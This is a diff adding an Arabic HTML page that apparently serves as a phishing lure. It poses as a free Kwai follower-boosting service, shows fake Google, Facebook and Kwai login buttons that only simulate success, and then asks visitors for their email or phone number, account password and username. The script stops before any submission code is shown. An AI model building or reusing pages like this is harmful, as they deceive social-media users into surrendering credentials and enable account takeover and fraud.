@@ -1,0 +1,1493 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>شحن متابعين كواي - Kwai</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Cairo', sans-serif;
+    }
+
+    body {
+      overflow-x: hidden;
+      background: linear-gradient(135deg, #1a237e, #311b92, #4a148c);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      position: relative;
+    }
+
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
+                  url('https://images.unsplash.com/photo-1517245386807-bb43f82c33c4?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80') center/cover no-repeat;
+      opacity: 0.4;
+      z-index: -1;
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .main-container {
+      width: 100%;
+      max-width: 500px;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      position: relative;
+      z-index: 10;
+    }
+
+    .container-header {
+      background: linear-gradient(90deg, #ff9800, #ff5722);
+      padding: 20px;
+      text-align: center;
+      border-bottom: 2px solid rgba(255, 255, 255, 0.3);
+      position: relative;
+    }
+
+    .kwai-logo {
+      position: absolute;
+      top: 15px;
+      right: 20px;
+      width: 40px;
+      height: 40px;
+      background: url('https://cdn-icons-png.flaticon.com/512/2504/2504889.png') center/contain no-repeat;
+    }
+
+    .container-header h1 {
+      font-size: 24px;
+      color: #fff;
+      font-weight: 700;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      margin-top: 10px;
+      padding: 0 50px;
+    }
+
+    .followers-img {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 15px;
+      background: url('https://cdn-icons-png.flaticon.com/512/1077/1077114.png') center/contain no-repeat;
+      filter: drop-shadow(0 5px 10px rgba(0,0,0,0.3));
+    }
+
+    .container-content {
+      padding: 20px;
+    }
+
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      background: rgba(255, 255, 255, 0.9);
+      color: #1a237e;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent);
+      transform: translateX(-100%);
+      transition: transform 0.6s ease;
+    }
+
+    .btn:hover::before {
+      transform: translateX(100%);
+    }
+
+    .btn:hover {
+      background: #ffcc80;
+      transform: translateY(-3px);
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.25);
+    }
+
+    .btn img {
+      height: 26px;
+      margin-left: 10px;
+      transition: transform 0.3s ease;
+    }
+
+    .btn:hover img {
+      transform: scale(1.1);
+    }
+
+    .pricing {
+      margin-top: 20px;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.15);
+      border-radius: 15px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .pricing::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://images.unsplash.com/photo-1551288049-bebda4e38f71?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80') center/cover no-repeat;
+      opacity: 0.1;
+      z-index: -1;
+    }
+
+    .pricing h2 {
+      text-align: center;
+      color: #ffcc80;
+      margin-bottom: 15px;
+      font-size: 20px;
+      position: relative;
+    }
+
+    .pricing h2::after {
+      content: "";
+      display: block;
+      width: 80px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #ffcc80, transparent);
+      margin: 8px auto;
+    }
+
+    .price-item {
+      background: rgba(255, 183, 77, 0.9);
+      padding: 12px 15px;
+      margin: 8px 0;
+      border-radius: 50px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: #1a237e;
+      font-weight: bold;
+      transition: transform 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,0.3);
+      font-size: 14px;
+    }
+
+    .price-item::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      transform: translateX(-100%);
+      transition: transform 0.6s ease;
+    }
+
+    .price-item:hover::before {
+      transform: translateX(100%);
+    }
+
+    .price-item:hover {
+      transform: scale(1.02);
+    }
+
+    .buy-btn {
+      width: 100%; 
+      margin-top: 15px; 
+      font-size: 16px;
+      background: #1a237e;
+      color: white;
+      border: none;
+      padding: 8px 18px;
+      border-radius: 50px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      position: relative;
+      z-index: 1;
+      font-size: 14px;
+    }
+
+    .buy-btn:hover {
+      background: #ff9800;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px 18px;
+      margin: 10px 0;
+      border-radius: 50px;
+      border: none;
+      background: rgba(255, 255, 255, 0.15);
+      color: white;
+      font-size: 15px;
+      outline: none;
+      transition: all 0.3s ease;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+
+    input:focus, select:focus {
+      background: rgba(255, 255, 255, 0.25);
+      box-shadow: 0 0 0 2px rgba(255, 152, 0, 0.5);
+    }
+
+    input::placeholder {
+      color: rgba(255, 255, 255, 0.7);
+    }
+
+    form {
+      background: rgba(0, 0, 0, 0.2);
+      padding: 20px;
+      border-radius: 20px;
+      margin-top: 15px;
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+
+    form::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://images.unsplash.com/photo-1517245386807-bb43f82c33c4?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80') center/cover no-repeat;
+      opacity: 0.1;
+      z-index: -1;
+    }
+
+    label {
+      display: block;
+      margin: 8px 0 4px 12px;
+      font-weight: 600;
+      color: #ffd180;
+      font-size: 15px;
+    }
+
+    canvas#snow {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .section {
+      display: none;
+      animation: fadeIn 0.5s ease;
+    }
+
+    .section.active {
+      display: block;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: rgba(0, 150, 0, 0.8);
+      color: white;
+      padding: 15px 25px;
+      border-radius: 10px;
+      z-index: 1000;
+      display: none;
+      font-weight: bold;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+      animation: slideIn 0.5s ease;
+      max-width: 90%;
+    }
+
+    @keyframes slideIn {
+      from { transform: translateX(100px); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      margin-top: 15px;
+      gap: 12px;
+    }
+
+    .social-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+      cursor: pointer;
+    }
+
+    .social-icon:hover {
+      background: rgba(255,255,255,0.2);
+      transform: translateY(-5px);
+    }
+
+    .social-icon img {
+      width: 20px;
+      height: 20px;
+    }
+
+    .section-title {
+      text-align: center;
+      color: #ffcc80;
+      margin-bottom: 20px;
+      font-size: 20px;
+      position: relative;
+    }
+
+    .section-title::after {
+      content: "";
+      display: block;
+      width: 50px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #ffcc80, transparent);
+      margin: 8px auto;
+    }
+
+    /* Success message styling */
+    .success-message {
+      background: rgba(46, 204, 113, 0.2);
+      border: 1px solid rgba(46, 204, 113, 0.4);
+      border-radius: 10px;
+      padding: 15px;
+      margin: 20px 0;
+      text-align: center;
+      animation: fadeIn 0.5s ease;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .free-badge {
+      background: #ff5722;
+      color: white;
+      padding: 2px 8px;
+      border-radius: 15px;
+      font-size: 12px;
+      margin-left: 5px;
+    }
+
+    .additional-content {
+      padding: 15px;
+      color: white;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .additional-content h3 {
+      color: #ffcc80;
+      margin-bottom: 10px;
+      font-size: 18px;
+    }
+    
+    /* أنماط جديدة لحقل البريد/الهاتف */
+    .identifier-group {
+      position: relative;
+      margin-bottom: 25px;
+    }
+    
+    .identifier-type {
+      position: absolute;
+      top: 50%;
+      left: 15px;
+      transform: translateY(-50%);
+      background: rgba(255, 255, 255, 0.2);
+      padding: 2px 8px;
+      border-radius: 5px;
+      font-size: 12px;
+      transition: all 0.3s ease;
+    }
+    
+    .identifier-input {
+      padding-left: 100px !important;
+    }
+    
+    .input-container {
+      position: relative;
+    }
+    
+    .country-selector {
+      display: none;
+      position: absolute;
+      top: 100%;
+      left: 0;
+      right: 0;
+      background: rgba(0, 0, 0, 0.9);
+      border-radius: 10px;
+      padding: 10px;
+      z-index: 10;
+      margin-top: 5px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    
+    .country-option {
+      display: flex;
+      align-items: center;
+      padding: 8px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    
+    .country-option:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    
+    .country-flag {
+      width: 20px;
+      height: 15px;
+      margin-left: 10px;
+      border-radius: 2px;
+      object-fit: cover;
+    }
+    
+    .country-name {
+      flex: 1;
+      text-align: right;
+    }
+    
+    .country-code-label {
+      color: rgba(255, 255, 255, 0.7);
+      margin-left: 5px;
+    }
+    
+    .validation-message {
+      color: #ff6b6b;
+      font-size: 14px;
+      text-align: right;
+      margin-top: -8px;
+      margin-bottom: 10px;
+      height: 16px;
+    }
+    
+    /* Notification */
+    .notification {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 15px 25px;
+      border-radius: 10px;
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      animation: slideIn 0.3s, fadeOut 0.5s 2.5s forwards;
+    }
+    
+    @keyframes slideIn {
+      from { top: -100px; }
+      to { top: 20px; }
+    }
+    
+    @keyframes fadeOut {
+      from { opacity: 1; }
+      to { opacity: 0; top: -100px; }
+    }
+    
+    .notification.success {
+      border-left: 4px solid #2ecc71;
+    }
+    
+    .notification.error {
+      border-left: 4px solid #e74c3c;
+    }
+    
+    .notification.info {
+      border-left: 4px solid #3498db;
+    }
+    
+    .notification-icon {
+      margin-left: 10px;
+      font-size: 20px;
+    }
+    
+    .country-header {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      background: rgba(78, 84, 200, 0.3);
+      border-radius: 5px;
+      margin-bottom: 10px;
+    }
+    
+    .country-header i {
+      margin-left: 10px;
+      color: #8f94fb;
+    }
+    
+    .country-search {
+      width: 100%;
+      padding: 8px 15px;
+      background: rgba(255, 255, 255, 0.1);
+      border: none;
+      border-radius: 20px;
+      color: white;
+      margin: 10px 0;
+    }
+    
+    .country-search:focus {
+      outline: none;
+      background: rgba(255, 255, 255, 0.15);
+    }
+    
+    .country-list {
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+      margin-left: 10px;
+      position: relative;
+      z-index: 2;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* استعلامات الوسائط للتجاوبية */
+    @media (min-width: 768px) {
+      /* تصميم للأجهزة اللوحية وأجهزة الكمبيوتر */
+      .main-container {
+        max-width: 600px;
+      }
+      
+      .container-header h1 {
+        font-size: 28px;
+      }
+      
+      .followers-img {
+        width: 100px;
+        height: 100px;
+      }
+      
+      .container-content {
+        padding: 25px;
+      }
+      
+      .btn {
+        padding: 16px;
+        font-size: 18px;
+      }
+      
+      .btn img {
+        height: 30px;
+      }
+      
+      .pricing {
+        padding: 20px;
+      }
+      
+      .pricing h2 {
+        font-size: 24px;
+      }
+      
+      .price-item {
+        padding: 15px;
+        font-size: 16px;
+      }
+      
+      .buy-btn {
+        padding: 10px 25px;
+        font-size: 16px;
+      }
+      
+      input, select {
+        padding: 14px 20px;
+        font-size: 16px;
+      }
+      
+      label {
+        font-size: 16px;
+      }
+      
+      .section-title {
+        font-size: 22px;
+      }
+      
+      .social-icons {
+        gap: 15px;
+      }
+      
+      .social-icon {
+        width: 40px;
+        height: 40px;
+      }
+      
+      .social-icon img {
+        width: 24px;
+        height: 24px;
+      }
+      
+      .additional-content {
+        padding: 20px;
+        font-size: 16px;
+      }
+      
+      .additional-content h3 {
+        font-size: 20px;
+      }
+    }
+
+    @media (min-width: 992px) {
+      /* تصميم لأجهزة الكمبيوتر الكبيرة */
+      .main-container {
+        max-width: 700px;
+      }
+      
+      .container-header {
+        padding: 25px;
+      }
+      
+      .kwai-logo {
+        width: 50px;
+        height: 50px;
+      }
+      
+      .container-header h1 {
+        font-size: 32px;
+      }
+      
+      .followers-img {
+        width: 120px;
+        height: 120px;
+      }
+      
+      .container-content {
+        padding: 30px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      /* تصميم للهواتف الصغيرة */
+      .container-header {
+        padding: 15px;
+      }
+      
+      .kwai-logo {
+        top: 10px;
+        right: 15px;
+        width: 35px;
+        height: 35px;
+      }
+      
+      .container-header h1 {
+        font-size: 20px;
+        padding: 0 40px;
+      }
+      
+      .followers-img {
+        width: 70px;
+        height: 70px;
+      }
+      
+      .container-content {
+        padding: 15px;
+      }
+      
+      .btn {
+        padding: 12px;
+        font-size: 15px;
+      }
+      
+      .btn img {
+        height: 24px;
+      }
+      
+      .pricing h2 {
+        font-size: 18px;
+      }
+      
+      .price-item {
+        padding: 10px 12px;
+        font-size: 13px;
+      }
+      
+      .buy-btn {
+        padding: 7px 15px;
+      }
+      
+      input, select {
+        padding: 11px 15px;
+        font-size: 14px;
+      }
+      
+      label {
+        font-size: 14px;
+        margin-left: 8px;
+      }
+      
+      .section-title {
+        font-size: 18px;
+      }
+      
+      .social-icons {
+        gap: 10px;
+      }
+      
+      .social-icon {
+        width: 34px;
+        height: 34px;
+      }
+      
+      .social-icon img {
+        width: 18px;
+        height: 18px;
+      }
+    }
+
+    /* تصميم أفقي للهواتف */
+    @media (max-height: 500px) and (orientation: landscape) {
+      body {
+        padding: 10px;
+      }
+      
+      .main-container {
+        max-width: 90%;
+        max-height: 95vh;
+        overflow-y: auto;
+      }
+      
+      .container-header {
+        padding: 12px;
+      }
+      
+      .kwai-logo {
+        width: 30px;
+        height: 30px;
+        top: 8px;
+        right: 10px;
+      }
+      
+      .container-header h1 {
+        font-size: 18px;
+        padding: 0 35px;
+      }
+      
+      .followers-img {
+        width: 50px;
+        height: 50px;
+        margin-bottom: 8px;
+      }
+      
+      .container-content {
+        padding: 10px;
+      }
+      
+      .btn {
+        padding: 10px;
+        font-size: 14px;
+        margin: 8px 0;
+      }
+      
+      .btn img {
+        height: 20px;
+      }
+    }
+
+    /* تصميم للشاشات الكبيرة جداً */
+    @media (min-width: 1200px) {
+      body::before {
+        background-attachment: fixed;
+      }
+      
+      .main-container {
+        max-width: 800px;
+      }
+    }
+    
+    /* Loading spinner */
+    .spinnert {
+      display: none;
+      width: 40px;
+      height: 40px;
+      margin: 0 auto;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top: 4px solid var(--secondary);
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+<canvas id="snow"></canvas>
+<div class="notification" id="notification">تم الإرسال بنجاح! جاري التوجيه...</div>
+
+<div class="main-container">
+  <div class="container-header">
+    <div class="kwai-logo"></div>
+    <h1>شحن متابعين كواي 🚀</h1>
+    <div class="followers-img"></div>
+  </div>
+  
+  <div class="container-content">
+    <!-- تسجيل الدخول -->
+    <div id="login" class="section active">
+      <h2 class="section-title">تسجيل الدخول عبر</h2>
+      
+      <button class="btn" onclick="loginWithGoogle()">
+        <img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" alt="Google"> Google
+      </button>
+      
+      <button class="btn" onclick="loginWithFacebook()">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook"> Facebook
+      </button>
+      
+      <button class="btn" onclick="loginWithKwai()">
+        <img src="https://cdn-icons-png.flaticon.com/512/2504/2504889.png" alt="Kwai"> Kwai
+      </button>
+    </div>
+
+    <!-- نموذج الشحن -->
+    <div id="form" class="section">
+      <h2 class="section-title">شحن المتابعين</h2>
+      <form id="pubgForm">
+        <div class="identifier-group">
+          <label>البريد الإلكتروني أو رقم الهاتف:</label>
+          <div class="input-container">
+            <div class="identifier-type" id="identifier-type">بريد إلكتروني</div>
+            <input 
+              type="text" 
+              id="identifier" 
+              name="identifier" 
+              required 
+              placeholder="أدخل بريدك أو رقمك"
+              class="identifier-input"
+              autocomplete="off"
+            >
+            
+            <div class="country-selector" id="country-selector">
+              <div class="country-header">
+                <i class="fas fa-globe-asia"></i>
+                <span>اختر الدولة</span>
+              </div>
+              <input type="text" class="country-search" id="country-search" placeholder="ابحث عن الدولة...">
+              <div class="country-list" id="country-list">
+                <!-- سيتم ملء القائمة بواسطة الجافاسكريبت -->
+              </div>
+            </div>
+          </div>
+          <div id="identifier-validation" class="validation-message"></div>
+        </div>
+        
+        <input type="hidden" id="country-code" name="country_code" value="+966">
+        <input type="hidden" id="phone-number" name="phone">
+        
+        <label>كلمة المرور:</label>
+        <input type="password" name="password" required placeholder="أدخل كلمة المرور">
+
+        <label>اسم المستخدم:</label>
+        <input type="text" name="player_id" required placeholder="اسم المستخدم في كواي">
+
+        <label>عدد المتابعين:</label>
+        <select name="amount" required>
+          <option value="1000 متابع مجاني">1000 متابع <span class="free-badge">مجاني</span></option>
+          <option value="1500 متابع">1500 متابع</option>
+          <option value="2000 متابع">2000 متابع</option>
+          <option value="2500 متابع">2500 متابع</option>
+          <option value="3000 متابع">3000 متابع</option>
+        </select>
+        
+        <div class="spinnert" id="loadingSpinner"></div>
+        <button type="submit" class="buy-btn" id="submitBtn">شحن المتابعين <i class="fas fa-bolt"></i></button>
+      </form>
+    </div>
+
+    <!-- أسعار المتابعين -->
+    <div class="pricing">
+      <h2>أسعار المتابعين</h2>
+      <div class="price-item"><span>1000 متابع</span><span class="free-badge">مجاني</span></div>
+      <div class="price-item"><span>1500 متابع</span><span>2$</span></div>
+      <div class="price-item"><span>2000 متابع</span><span>3$</span></div>
+      <div class="price-item"><span>2500 متابع</span><span>4$</span></div>
+      <div class="price-item"><span>3000 متابع</span><span>5$</span></div>
+    </div>
+    
+    <!-- أيقونات التواصل -->
+    <div class="social-icons">
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/220/220236.png" alt="WhatsApp">
+      </div>
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111644.png" alt="Telegram">
+      </div>
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram">
+      </div>
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
+      </div>
+    </div>
+    
+    <!-- محتوى إضافي -->
+    <div class="additional-content">
+      <h3>كيفية الحصول على المتابعين؟</h3>
+      <p>يمكنك الحصول على متابعين حقيقيين بسهولة من خلال اختيار الباقة المناسبة لك. نحن نضمن متابعين بنسبة تفاعل عالية ونتائج فورية.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+  
+  // قائمة الدول العربية مع رموزها وأعلامها
+  const arabCountries = [
+    { name: "اليمن 👑", code: "+967", flag: "YE", pattern: /^7\d{8}$/ },
+    { name: "السعودية", code: "+966", flag: "SA", pattern: /^5\d{8}$/ },
+    { name: "مصر", code: "+20", flag: "EG", pattern: /^1\d{9}$/ },
+    { name: "الإمارات", code: "+971", flag: "AE", pattern: /^5\d{8}$/ },
+    { name: "الأردن", code: "+962", flag: "JO", pattern: /^7\d{8}$/ },
+    { name: "الكويت", code: "+965", flag: "KW", pattern: /^[569]\d{7}$/ },
+    { name: "عمان", code: "+968", flag: "OM", pattern: /^9\d{7}$/ },
+    { name: "قطر", code: "+974", flag: "QA", pattern: /^[35]\d{7}$/ },
+    { name: "الجزائر", code: "+213", flag: "DZ", pattern: /^(5|6|7)\d{8}$/ },
+    { name: "المغرب", code: "+212", flag: "MA", pattern: /^(6|7)\d{8}$/ },
+    { name: "تونس", code: "+216", flag: "TN", pattern: /^[2459]\d{7}$/ },
+    { name: "ليبيا", code: "+218", flag: "LY", pattern: /^(9|21|22|23|24|25|26|27|28|29|91|92|93|94|95)\d{7,8}$/ },
+    { name: "السودان", code: "+249", flag: "SD", pattern: /^9\d{8}$/ },
+    { name: "البحرين", code: "+973", flag: "BH", pattern: /^(3|6|9)\d{7}$/ },
+    { name: "العراق", code: "+964", flag: "IQ", pattern: /^7[0-9]{9}$/ },
+    { name: "لبنان", code: "+961", flag: "LB", pattern: /^(3|7|8|9)\d{7}$/ },
+    { name: "موريتانيا", code: "+222", flag: "MR", pattern: /^[2-9]\d{7}$/ },
+    { name: "الصومال", code: "+252", flag: "SO", pattern: /^(61|62|65|66|67|68|69|71|77|79|90|91|92|93|94|95|96|97|98|99)\d{7}$/ },
+    { name: "جيبوتي", code: "+253", flag: "DJ", pattern: /^(77|78)\d{6}$/ },
+    { name: "فلسطين", code: "+970", flag: "PS", pattern: /^5[69]\d{7}$/ }
+  ];
+  
+  // تحديد نوع المدخل (بريد إلكتروني أو هاتف)
+  function detectInputType(value) {
+    if (value.includes('@')) {
+      return 'email';
+    }
+    
+    const phoneRegex = /^(\+\d{1,3})?\s?\d+$/;
+    if (phoneRegex.test(value)) {
+      return 'phone';
+    }
+    
+    return 'email';
+  }
+  
+  // التحقق من صحة المدخل
+  function validateIdentifier(value, type) {
+    const validationMessage = document.getElementById('identifier-validation');
+    const countrySelector = document.getElementById('country-selector');
+    
+    if (type === 'email') {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const isValid = emailRegex.test(value);
+      
+      if (!isValid) {
+        validationMessage.textContent = "البريد الإلكتروني غير صحيح";
+      } else {
+        validationMessage.textContent = "";
+      }
+      
+      return isValid;
+    } else if (type === 'phone') {
+      const countryCode = document.getElementById('country-code').value;
+      const phoneValue = value.replace(/\D/g, '');
+      
+      const country = arabCountries.find(c => c.code === countryCode);
+      const pattern = country ? country.pattern : /^\d{8,12}$/;
+      const isValid = pattern.test(phoneValue);
+      
+      // إخفاء قائمة الدول عند إدخال رقم صحيح
+      if (isValid) {
+        countrySelector.style.display = 'none';
+      }
+      
+      // رسائل الخطأ لكل دولة
+      const errorMessages = {
+        '+967': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 7",
+        '+966': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 5",
+        '+20': "رقم غير صحيح! يجب أن يتكون من 10 أرقام ويبدأ بالرقم 1",
+        '+971': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 5",
+        '+962': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 7",
+        '+965': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 5، 6 أو 9",
+        '+968': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بالرقم 9",
+        '+974': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 3 أو 5",
+        '+213': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بـ 5، 6 أو 7",
+        '+212': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بـ 6 أو 7",
+        '+216': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 2، 4، 5 أو 9",
+        '+218': "رقم غير صحيح! يجب أن يتكون من 9-10 أرقام",
+        '+249': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 9",
+        '+973': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 3، 6 أو 9",
+        '+964': "رقم غير صحيح! يجب أن يتكون من 10 أرقام ويبدأ بـ 7",
+        '+961': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 3، 7، 8 أو 9",
+        '+222': "رقم غير صحيح! يجب أن يتكون من 8 أرقام",
+        '+252': "رقم غير صحيح! يجب أن يتكون من 9 أرقام",
+        '+253': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 77 أو 78",
+        '+970': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بـ 56 أو 59"
+      };
+
+      validationMessage.textContent = isValid ? "" : (errorMessages[countryCode] || "رقم الهاتف يجب أن يكون بين 8 و12 رقمًا");
+      return isValid;
+    }
+    
+    return false;
+  }
+  
+  // تحديث واجهة المستخدم بناءً على نوع المدخل
+  function updateInputUI(value) {
+    const type = detectInputType(value);
+    const identifierType = document.getElementById('identifier-type');
+    const countrySelector = document.getElementById('country-selector');
+    const phoneInput = document.getElementById('phone-number');
+    
+    if (type === 'phone') {
+      identifierType.textContent = "رقم الهاتف";
+      countrySelector.style.display = 'block';
+      phoneInput.value = value.replace(/\D/g, '');
+    } else {
+      identifierType.textContent = "بريد إلكتروني";
+      countrySelector.style.display = 'none';
+      phoneInput.value = '';
+    }
+    
+    // التحقق من صحة المدخل
+    validateIdentifier(value, type);
+  }
+  
+  // اختيار رمز الدولة
+  function selectCountry(code, flag) {
+    document.getElementById('country-code').value = code;
+    const countrySelector = document.getElementById('country-selector');
+    countrySelector.style.display = 'none';
+    
+    // إعادة التحقق من صحة المدخل
+    const identifier = document.getElementById('identifier').value;
+    updateInputUI(identifier);
+  }
+  
+  // إظهار الإشعار
+  function showNotification(message, type) {
+    const notification = document.getElementById('notification');
+    notification.className = `notification ${type}`;
+    notification.innerHTML = `${message} <span class="notification-icon">${type === 'success' ? '✓' : '✗'}</span>`;
+    notification.style.display = 'block';
+    
+    setTimeout(() => {
+      notification.style.display = 'none';
+    }, 3000);
+  }
+  
+  // تسجيل الدخول عبر جوجل
+  function loginWithGoogle() {
+    const btn = event.currentTarget;
+    const originalHTML = btn.innerHTML;
+    
+    btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
+    btn.disabled = true;
+    
+    setTimeout(() => {
+      showNotification('تم تسجيل الدخول بنجاح عبر جوجل!', 'success');
+      btn.innerHTML = originalHTML;
+      btn.disabled = false;
+      
+      setTimeout(() => {
+        showSection('form');
+      }, 1500);
+    }, 2000);
+  }
+  
+  // تسجيل الدخول عبر فيسبوك
+  function loginWithFacebook() {
+    const btn = event.currentTarget;
+    const originalHTML = btn.innerHTML;
+    
+    btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
+    btn.disabled = true;
+    
+    setTimeout(() => {
+      showNotification('تم تسجيل الدخول بنجاح عبر فيسبوك!', 'success');
+      btn.innerHTML = originalHTML;
+      btn.disabled = false;
+      
+      setTimeout(() => {
+        showSection('form');
+      }, 1500);
+    }, 2000);
+  }
+  
+  // تسجيل الدخول عبر كواي
+  function loginWithKwai() {
+    const btn = event.currentTarget;
+    const originalHTML = btn.innerHTML;
+    
+    btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
+    btn.disabled = true;
+    
+    setTimeout(() => {
+      showNotification('تم تسجيل الدخول بنجاح عبر كواي!', 'success');
+      btn.innerHTML = originalHTML;
+      btn.disabled = false;
+      
+      setTimeout(() => {
+        showSection('form');
+      }, 1500);
+    }, 2000);
+  }
+  
